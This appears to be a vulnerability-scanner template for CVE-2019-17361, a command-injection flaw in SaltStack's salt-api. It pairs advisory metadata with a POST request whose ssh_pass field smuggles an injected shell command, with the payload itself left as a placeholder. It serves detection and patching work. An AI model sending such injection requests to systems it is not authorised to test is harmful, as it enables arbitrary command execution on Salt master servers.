id: CVE-2019-17361

info:
  name: SaltStack Salt API Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: In SaltStack Salt through 2019.2.0, the salt-api NET API with the ssh client enabled is vulnerable to command injection.
  impact: |
    An attacker can execute arbitrary commands on the Salt master server.
  remediation: |
    Upgrade to SaltStack version 2019.2.4 or later.
  reference:
    - http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00026.html
    - https://docs.saltstack.com/en/latest/topics/releases/2019.2.3.html#security-fix
    - https://usn.ubuntu.com/4459-1/
    - https://www.debian.org/security/2020/dsa-4676
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-17361
    cwe-id: CWE-77
    epss-score: 0.00537
    epss-percentile: 0.77914
    cpe: cpe:2.3:a:saltstack:salt:*:*:*:*:*:*:*:*
  metadata:
    vendor: saltstack
    product: salt

http:
  - method: POST
    path:
      - "{{BaseURL}}/run"

    headers:
      Content-Type: application/json

    body: |
      {
        "client": "ssh",
        "tgt": "*",
        "fun": "test.ping",
        "ssh_user": "root",
        "roster": "scan",
        "eauth": "auto",
        "ssh_pass": "'; <INJECTION_PAYLOAD> #"
      }
    matchers:
      - type: word
        words:
          - "return"
        part: body
